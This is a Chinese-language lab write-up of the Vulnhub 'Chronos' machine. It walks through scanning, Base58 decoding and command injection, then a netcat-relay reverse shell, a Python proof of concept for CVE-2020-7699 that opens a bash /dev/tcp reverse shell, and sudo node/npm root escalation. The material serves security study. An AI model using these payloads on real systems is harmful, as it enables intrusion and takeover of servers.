---
title: Chapter3_Medium_Chronos
categories:
- Network_Security
- Vulnhub
- Chapter3
tags:
- Network_Security
- Vulnhub
date: 2024-01-23 15:52:52
---

# Chronos 靶场记录

## 1. 过程记录（粗略）

### 1.1 服务发现和外围打点

1. 主机发现，使用新工具：netdiscover，也是基于 arp 的扫描工具：
    `sudo netdiscover -r 网段/实际掩码 - 8`

2. 端口扫描：
    `nmap -Pn -sV 192.168.0.101 -p 1-10000`
    服务如下：
    ![image-20240116113758731](image-20240116113758731.png)

3. 除了目录扫描，还可以查看一下网页源代码，这里发现一个加密脚本：
    ![image-20240116114455084](image-20240116114455084.png)

4. 使用 cyberchef 对代码进行美化，cyberchef 本身也有编码转化等功能：
    ![image-20240116115232477](image-20240116115232477.png)

5. 根据 URL 猜测，试着访问：
    `http://192.168.0.101:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`
    发现权限不够。

6. 通过修改 f12，将域名换成 IP，出现 CORS 跨域错误。因此这里需要修改 host 文件，让这个域名指向目标 IP。
    `sudo vim /etc/hosts`

7. 再次访问，页面更新，但是没有啥交互窗口，因此抓个包看看。
    根据 HTTP 历史，总共有三个包，着重看返回日期的包：
    ![image-20240116141132284](image-20240116141132284.png)
    经过测试发现，当 User-Agent 为 Chronos 时，会返回时间，否则提示 Permission Denied。

8. 其次，尝试猜测 format 的含义，修改内容后，服务端无法返回时间。尝试解码，像是 Base 系列编码，挨个试试，结果是 Base 58 编码：
    ![image-20240116141624700](image-20240116141624700.png)
    这里用的是 CaptfEncoder V2，用 CyberChef 的 magic 让它自动分析编码也省事。

9. 结果是 Linux date 命令的参数，这确实是想不到。测试：
    `9bEW4cq4qengPvFGtzJXEAs1sGpKzYpYvUjwvUngwAmfrVsMwAERK9ox - '+Today is %A, %B %d, %Y %H:%M:%S.' && ls`
    结果返回出来了，说明存在 RCE。

### 1.2 反弹 Shell 与信息收集

1. 查看靶机的 /bin，发现其有 nc，因此用 NC 串联来建立 Shell：
    `7ihptVs1vQRPedsgE9FnpNTWUwH5Ec9aGfvLfeuGgtc21faujqYQsojc89LSM4jDjPBprmKfkco7HEoZxxwPeBjAkbDAe6XXfdkc5oiTjwrn1tJc2pyJj2Y7k6PDpCBXtwCfBCkrap - '+Today is %A, %B %d, %Y %H:%M:%S.' | /bin/nc 192.168.0.2 4444 | /bin/bash | /bin/nc 192.168.0.2 5555`

2. 拿到 Shell 经过一段信息收集后，发现 imera 用户有个 user.txt 文件，但是没有权限查看，因此需要提权。

### 1.3 初步提权

1. 先查看内核，`'map_write() CAP_SYS_ADMIN' Local Privilege Escalation` 需要 Capabilities 权限，网上查找了一下，发现需要存在 Capabilities 的 CAP_SYS_ADMIN 权限的文件，通过 `getcap -r / 2>/dev/null` 找了一下，发现没有。

2. 内核没法提权，就从 suid 上试试，查找了一下，常见的 suid 程序也基本没有。
     再试试 sudo -l，结果也不行。

3. 回到网站本身，经过信息收集后，发现其有个 chronos-v2。查看后端的 package.json，发现它的 express-fileupload 版本是 1.1.7，恰好比 CVE-2020-7699 Express 模块注入漏洞的版本低，符合利用版本。

4. 再分析他的服务端的代码 server.js，他的服务端开启的服务只在 localhost:8080 端口，外部无法访问。

5. 从 CVE-2020-7699 Express 入手，百度 Google 去找 PoC，最终详情页在：

     > https://github.com/richardgirges/express-fileupload/issues/236
     >
     > https://blog.p6.is/Real-World-JS-1/

6. PoC:
     ```python
     import requests
      
     cmd = 'bash -c "bash -i &> /dev/tcp/192.168.0.2/8888（Kali） 0>&1"'
      
     # pollute
     requests.post('http://127.0.0.1:8080（存在漏洞的服务）', files = {'__proto__.outputFunctionName': (
         None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
      
     # execute command
     requests.get('http://127.0.0.1:8080（存在漏洞的服务）')
     ```

     将该 PoC 在靶机上用 Python3 执行，即可获得 Shell。

7. 此时获得的权限是 imera 的 shell，这时再查看 user.txt 文件。
     拿到第一个 flag：byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK

### 1.4 再次提权

1. 利用 sudo -l，发现可以提权：
     ![image-20240116163306479](image-20240116163306479.png)
     可以使用 sudo 来执行 npm 和 node 命令。

2. 使用 node 进行提权：
     `sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'`

     > https://haiclover.github.io/gtfobins/node/

3. 查看 root 的 txt 文件，第二个 flag：
     YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK

4. npm 的提权方式：
     ```bash
     TF=$(mktemp -d)
     echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
     sudo npm -C $TF --unsafe-perm i
     ```

     其他有关命令的提权命令：

     > https://ihsansencan.github.io/privilege-escalation/linux/binaries/

5. LXD 提权：

    > https://www.cnblogs.com/zlgxzswjy/p/14790554.html
    >
    > https://www.cnblogs.com/jason-huawen/p/17016263.html

## 2. 知识点总结

1. 新的主机发现工具 - netdiscover
2. Cyberchef 的使用
3. date 命令参数，这确实想不到，发散思维是吧（
4. CVE-2020-7699 Express 模块注入漏洞
5. node 、lxd 和 npm 提权。
6. 提权方向：
    1. 内核
    2. suid
    3. sudo 与具体命令，具体应用结合
    4. 特殊应用与用户组
